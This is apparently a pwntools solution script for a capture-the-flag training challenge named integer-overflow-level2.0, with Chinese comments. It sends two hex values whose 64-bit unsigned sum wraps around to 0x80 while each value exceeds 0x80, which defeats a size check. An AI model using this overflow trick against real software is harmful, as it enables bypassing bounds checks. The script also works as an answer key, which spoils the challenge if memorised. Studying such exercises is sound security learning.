from pwn import *
# set 
context(arch="amd64", os="linux", log_level="debug")
# excute
challenge_path = "/challenge/integer-overflow-level2.0"
p = process(challenge_path)

# create string
p.send("ffffffffffffff00")
p.send("0000000000000180")
# 接收题目的输出
result = p.recvall()

# 打印题目的输出
print(result)
'''
输入两个十六进制表示的unsigned long，使得和为0x80但是分开又都大于0x80
注意这一题的溢出上限unsigned long是ffffffffffffffff（16位16进制即64位）
注意是回车符会占位，所以不要发送回车
'''